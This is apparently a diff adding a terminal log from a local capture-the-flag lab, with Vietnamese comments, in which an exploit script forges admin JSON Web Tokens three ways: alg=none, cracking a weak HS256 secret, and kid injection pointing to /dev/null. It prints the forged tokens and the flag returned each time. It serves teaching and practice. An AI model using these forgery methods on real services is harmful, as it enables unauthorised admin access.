@@ -1,0 +1,27 @@
+$ python3 app.py        # terminal 1, lang nghe 127.0.0.1:8043
+ * Running on http://127.0.0.1:8043
+
+$ python3 exploit.py     # terminal 2
+[*] Token user that: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoid2llbmVyIiwicm9sZSI6InVzZXIifQ.PlVH_QeKjb3MB4mLrLEqDpr6z9jp777j93_wUPCm69c
+    payload: {'user': 'wiener', 'role': 'user'}
+    /admin voi token user -> {'error': 'not admin', 'ok': False, 'you': {'role': 'user', 'user': 'wiener'}}
+
+[*] Man A: alg=none
+    forged: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
+    /admin -> {'flag': 'FLAG{4.3_jwt_forged_admin}', 'ok': True, 'user': 'admin'}
+
+[*] Man B: crack secret HS256 roi ky lai
+    secret crack duoc = 'secret'
+    /admin -> {'flag': 'FLAG{4.3_jwt_forged_admin}', 'ok': True, 'user': 'admin'}
+
+[*] Man C: kid injection -> /dev/null (key rong)
+    forged kid=/dev/null: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9kZXYvbnVsbCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.gorXgZFosUy9zgJiPgj6L8YmiGvcww71iX3-GzbW4TM
+    /admin -> {'flag': 'FLAG{4.3_jwt_forged_admin}', 'ok': True, 'user': 'admin'}
+
+=== KET QUA ===
+  none   -> FORGE OK flag=FLAG{4.3_jwt_forged_admin}
+  crack  -> FORGE OK flag=FLAG{4.3_jwt_forged_admin}
+  kid    -> FORGE OK flag=FLAG{4.3_jwt_forged_admin}
+
+# Ca ba cach deu forge ra token role=admin va duoc /admin chap nhan.
+# none: chu ky rong. crack: secret='secret' nam trong wordlist. kid=/dev/null: key rong.
